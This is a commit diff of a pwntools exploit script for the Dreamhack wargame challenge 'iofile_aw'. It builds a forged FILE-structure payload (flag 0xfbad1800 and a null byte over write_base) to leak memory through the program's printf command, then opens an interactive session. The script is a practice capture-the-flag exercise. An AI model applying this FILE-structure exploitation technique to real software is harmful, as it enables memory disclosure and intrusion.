256189fca7783f0f1007975f999e214859d7d9bc
woounnan <woounnan@gmail.com>
2020-12-19 11:32:25 +0000

    t

--- dreamhack/iofile_aw/ex.py
+++ dreamhack/iofile_aw/ex.py
@@ -3,6 +3,9 @@ from pwn import *
 p = process('iofile_aw')
 payload = p64(0xfbad1800)
 payload += p64(0)*3
-payload +=
+payload += '\x00' #write_base
 p.sendlineafter('# ', 'printf ' + payload)
+p.sendlineafter('# ', 'help')
+raw_input('debug: ' + str(p.pid))
+p.interactive()
 
